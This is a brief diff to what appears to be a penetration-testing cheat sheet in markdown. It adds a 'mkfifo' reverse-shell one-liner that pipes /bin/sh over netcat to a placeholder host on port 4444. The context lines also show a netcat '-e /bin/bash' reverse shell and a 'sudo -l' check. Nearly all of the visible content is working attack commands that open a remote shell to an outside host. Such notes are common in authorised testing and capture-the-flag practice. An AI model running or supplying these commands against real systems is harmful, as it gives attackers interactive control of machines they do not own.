@@ -13,6 +13,13 @@ sudo -l
 ```
 
 ## Reverse Shell
+
+### mkfifo
+
+```
+mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
+```
+
 ### Client
 ```
 nc ip 4444 -e /bin/bash
